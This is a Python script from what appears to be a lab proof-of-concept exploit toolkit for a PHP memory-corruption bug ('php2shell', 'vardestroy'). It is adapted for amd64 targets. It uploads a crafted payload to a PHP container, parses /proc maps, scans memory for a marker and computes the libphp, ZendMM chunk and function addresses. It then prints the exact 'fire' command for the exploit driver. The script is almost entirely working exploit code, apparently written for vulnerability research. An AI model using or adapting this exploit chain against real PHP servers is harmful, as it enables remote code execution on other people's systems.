#!/usr/bin/env python3
"""LAB-ONLY action E: /proc measure for the amd64 (Rosetta/qemu) target.

`php2shell.maps.parse_maps` assumes the arm64 layout:
  * libphp.so's executable segment maps at file offset 0, and
  * the ZendMM main chunk is an exactly-2 MiB, 2 MiB-aligned anonymous rw
    mapping.
On linux/amd64 both assumptions break (r-xp starts at 0x157000; the main
chunk mapping starts one page before the 2 MiB boundary). This script does the
same measure with x86-64-aware parsing, then prints the exact `fire` arguments
for the unmodified driver.

No driver edits; fixed benign command.
"""
import argparse
import importlib.util
import os
import re
import secrets
import sys
import threading
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
_DRIVER = os.path.join(ROOT, "poc", "verify_115560_vardestroy.py")


def load_driver():
    spec = importlib.util.spec_from_file_location("vd115560", _DRIVER)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


MAP_RE = re.compile(
    r"^([0-9a-f]+)-([0-9a-f]+)\s+(....)\s+([0-9a-f]+)\s+\S+\s+\d+\s*(.*)$")


def parse_amd64(maps_text):
    """Return (libphp_base, [(anon_start, anon_end, candidate_main)])."""
    lib = None
    anon = []
    for line in maps_text.splitlines():
        m = MAP_RE.match(line)
        if not m:
            continue
        start, end = int(m.group(1), 16), int(m.group(2), 16)
        perm, off, path = m.group(3), int(m.group(4), 16), m.group(5).strip()
        # x86-64 libphp: first LOAD (r--p, offset 0) is the link-time base.
        if "libphp" in path and off == 0 and lib is None:
            lib = start
        if path == "" and perm.startswith("rw") and (end - start) >= 0x200000:
            # the 2 MiB ZendMM main chunk lives inside this mapping at the
            # next 2 MiB boundary (the mapping may start one page early).
            cand = (start + 0x1FFFFF) & ~0x1FFFFF
            if cand + 0x200000 <= end:
                anon.append((start, end, cand))
    return lib, anon


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18207")
    ap.add_argument("--container", default="php2shell-115560-amd64")
    ap.add_argument("--build", default="8.4.27")
    ap.add_argument("--measure-mode", default="5", choices=["0", "2", "5"])
    args = ap.parse_args()

    VD = load_driver()
    PC = VD.PC
    host, _, port = args.target.partition(":")
    port = int(port or 80)
    sid = secrets.token_hex(16)

    VD.sh(args.container, "rm -f /tmp/meas_pid /tmp/vd")
    val = bytearray(PC.build_value(0, 0, b"\x00" * 8, blob_fill=b"\x00"))
    val[VD.DOFF + VD.MOFF:VD.DOFF + VD.MOFF + len(VD.MAGIC) * 2] = VD.MAGIC * 2
    payload = VD.force_fail(bytes(val))

    VD.prime(host, port, args.container, sid)
    th = {}
    t = threading.Thread(target=lambda: th.setdefault(
        "r", VD.http_upload(host, port, f"/index.php?m={args.measure_mode}",
                            payload, sid)), daemon=True)
    t.start()

    pid = 0
    for _ in range(120):
        pid = int(VD.sh(args.container,
                        "cat /tmp/meas_pid 2>/dev/null").stdout.strip() or 0)
        if pid:
            break
        time.sleep(0.1)
    if not pid:
        print("[!] no /tmp/meas_pid")
        return 2

    maps_text = VD.sh(args.container, f"cat /proc/{pid}/maps").stdout
    lib, anon = parse_amd64(maps_text)
    print(f"[m] pid={pid} libphp_base={lib and hex(lib)}")
    print(f"[m] anon>=2MiB candidates: "
          f"{[(hex(a), hex(b), hex(c)) for a, b, c in anon]}")

    scan = VD.sh(args.container, f"php /var/www/html/scan_prefix.php {pid} "
                                 f"{(VD.MAGIC * 2).hex()} {VD.MOFF} {VD.DOFF} "
                                 f"{len(PC.PREFIX)}")
    hits = []
    for line in scan.stdout.splitlines():
        parts = line.split()
        if len(parts) < 3 or not parts[0].startswith("0x"):
            continue
        try:
            h = int(parts[0], 16)
            v = int(parts[1].split("=", 1)[1], 16)
        except (ValueError, IndexError):
            continue
        pref = parts[2].split("=", 1)[1] if "=" in parts[2] else ""
        hits.append((h, v, pref))
    if not hits:
        print(f"[!] scan failed: {scan.stdout.strip()} {scan.stderr.strip()}")
        VD.sh(args.container, f"kill -9 {pid} 2>/dev/null")
        return 2

    want = PC.PREFIX.hex()
    raw = [x for x in hits if x[2] == want]
    print(f"[m] magic hits={len(hits)} raw-input={len(raw)}")
    if not raw:
        print("[!] no raw-input PREFIX hit")
        VD.sh(args.container, f"kill -9 {pid} 2>/dev/null")
        return 2
    magic_addr, value_string, _ = raw[0]
    # value_string sits in the ZendMM main chunk: its 2 MiB-aligned base.
    main_addr = value_string & ~0x1FFFFF
    # sanity: main must be one of the parsed candidate chunk bases.
    cand_bases = {c for _a, _b, c in anon}
    print(f"[m] main={main_addr:#x} (aligned candidate={main_addr in cand_bases})")
    print(f"[m] magic={magic_addr:#x} value_string={value_string:#x} "
          f"delta={value_string - main_addr:#x} carrier={value_string + VD.DOFF:#x}")

    zif = VD.readelf_zif(args.container, lib) if lib else 0
    print(f"[m] zif={zif and hex(zif)} "
          f"zif_off={zif - lib if (zif and lib) else 0:#x}")
    if lib:
        print(f"[m] lib-main={lib - main_addr:#x}")

    VD.sh(args.container, f"kill -9 {pid} 2>/dev/null")
    t.join(timeout=5)
    time.sleep(0.8)

    if lib and zif:
        print("\n[cmd] unmodified driver fire:")
        print(f"  python3 poc/verify_115560_vardestroy.py --target {args.target} "
              f"--container {args.container} --build {args.build} "
              f"--main {main_addr:#x} --delta {value_string - main_addr:#x} "
              f"--lib {lib:#x} --zif {zif:#x} fire")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
